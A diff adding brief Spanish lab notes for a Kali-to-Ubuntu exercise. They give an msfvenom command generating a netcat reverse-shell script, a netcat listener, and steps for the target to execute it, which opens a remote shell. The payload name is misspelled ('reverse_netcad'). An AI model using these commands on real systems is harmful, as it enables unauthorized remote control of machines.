@@ -1,4 +1,10 @@
 ++ PC1: Kali
 ++ PC2: Ubuntu
 
-PC1: 
+++ PC1: msfvenom -p cmd/unix/reverse_netcad lhost=<ip_PC1> lport=444 -o <nombre_programa.sh>
+++ PC1: nc -lvp 444
+++ PC2: Ejecutar el archivo generado mediante los siguientes comandos:
+--- chmod +x <nombre_archivo.sh>
+--- ./<nombre_archivo.sh>
+++ PC1: En estos momentos se ha establecido el reverse shell, lo que nos permite
+ejecutar comandos
